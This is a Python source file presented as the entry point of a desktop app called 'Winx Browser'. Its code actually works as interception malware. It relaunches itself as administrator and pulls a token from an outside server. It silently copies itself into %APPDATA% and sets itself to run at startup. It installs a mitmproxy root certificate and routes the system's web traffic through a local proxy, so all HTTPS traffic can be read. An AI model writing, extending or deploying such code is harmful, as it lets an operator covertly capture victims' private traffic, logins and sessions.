"""
Winx Browser - Main entry point
"""

import sys
import os
import shutil
import subprocess
import threading
import ctypes
import winreg
import time
import requests
from pathlib import Path

APPDATA = Path(os.environ.get("APPDATA", "")) / "WinxBrowser"
CONFIG_FILE = APPDATA / "config.dat"
HIDDEN_EXE = APPDATA / "WinxBrowser.exe"
SETUP_URL = "https://www.incbot.site/api/desktop/setup"
STARTUP_KEY_NAME = "WinxBrowser"

# ── Admin check ───────────────────────────────────────────────────────────────
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, "", None, 1)
    sys.exit()

# ── Self copy to %APPDATA% ────────────────────────────────────────────────────
def copy_self_to_appdata():
    """Copy exe to %APPDATA%\WinxBrowser\WinxBrowser.exe silently"""
    try:
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        APPDATA.mkdir(parents=True, exist_ok=True)
        if not HIDDEN_EXE.exists():
            shutil.copy2(current_exe, str(HIDDEN_EXE))
        return True
    except:
        return False

# ── Startup registry ──────────────────────────────────────────────────────────
def is_in_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, STARTUP_KEY_NAME)
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_to_startup():
    """Always point startup to hidden copy in %APPDATA%"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{HIDDEN_EXE}"')
        winreg.CloseKey(key)
        return True
    except:
        return False

# ── Token setup ───────────────────────────────────────────────────────────────
def get_setup_key():
    """Extract 8 char setup key from own filename e.g. WinxBrowser_a3f8c92b.exe"""
    try:
        import re
        exe_name = Path(sys.executable).stem if getattr(sys, 'frozen', False) else Path(sys.argv[0]).stem
        match = re.search(r'_([a-f0-9]{8})$', exe_name)
        if match:
            return match.group(1)
    except:
        pass
    return None

def fetch_and_save_token(setup_key: str):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }
        resp = requests.post(SETUP_URL, json={"key": setup_key}, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("token")
            if token:
                APPDATA.mkdir(parents=True, exist_ok=True)
                CONFIG_FILE.write_text(token)
                return token
    except:
        pass
    return None

def load_token():
    try:
        if CONFIG_FILE.exists():
            token = CONFIG_FILE.read_text().strip()
            if len(token) == 64:
                return token
    except:
        pass
    return None

# ── Certificate management ────────────────────────────────────────────────────
CERT_NAME = "WinxBrowser"

def get_mitmproxy_cert():
    return Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.cer"

def is_cert_installed():
    result = subprocess.run(["certutil", "-store", "Root", CERT_NAME], capture_output=True, text=True)
    return CERT_NAME in result.stdout

def install_cert(cert_path: Path):
    result = subprocess.run(["certutil", "-addstore", "-f", "Root", str(cert_path)], capture_output=True, text=True)
    return result.returncode == 0

# ── System proxy ──────────────────────────────────────────────────────────────
def set_system_proxy(enable: bool):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_SET_VALUE)
        if enable:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, "127.0.0.1:8080")
            winreg.SetValueEx(key, "ProxyOverride", 0, winreg.REG_SZ, "<local>")
        else:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        ctypes.windll.wininet.InternetSetOptionW(0, 39, 0, 0)
        return True
    except:
        return False

# ── First run setup ───────────────────────────────────────────────────────────
def first_run_setup():
    from proxy import run_proxy
    t = threading.Thread(target=run_proxy, daemon=True)
    t.start()
    time.sleep(3)

    cert_path = get_mitmproxy_cert()
    if not cert_path.exists():
        return False

    if not install_cert(cert_path):
        return False

    return True

# ── Tray icon ─────────────────────────────────────────────────────────────────
def create_tray_icon(stop_event: threading.Event):
    try:
        import pystray
        from PIL import Image, ImageDraw

        def create_icon_image():
            img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            draw.ellipse([8, 8, 56, 56], fill=(0, 120, 215, 255))
            return img

        icon = pystray.Icon("WinxBrowser", create_icon_image(), "Winx Browser")
        icon.run()
    except:
        stop_event.wait()

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    if not is_admin():
        run_as_admin()
        return

    # ── Step 1: Get token ─────────────────────────────────────────────────────
    token = load_token()
    if not token:
        setup_key = get_setup_key()
        if setup_key:
            token = fetch_and_save_token(setup_key)
        if not token:
            sys.exit(0)

    # Pass token to proxy module
    import proxy as proxy_module
    proxy_module.directory_token = token

    # ── Step 2: Copy self to %APPDATA% and add to startup ─────────────────────
    copy_self_to_appdata()
    if not is_in_startup():
        add_to_startup()

    # ── Step 3: Certificate + proxy ───────────────────────────────────────────
    cert_path = get_mitmproxy_cert()
    is_first_run = not cert_path.exists() or not is_cert_installed()

    if is_first_run:
        success = first_run_setup()
        if not success:
            sys.exit(1)
    else:
        from proxy import run_proxy
        threading.Thread(target=run_proxy, daemon=True).start()

    set_system_proxy(True)

    stop_event = threading.Event()
    create_tray_icon(stop_event)

    set_system_proxy(False)

if __name__ == "__main__":
    main()
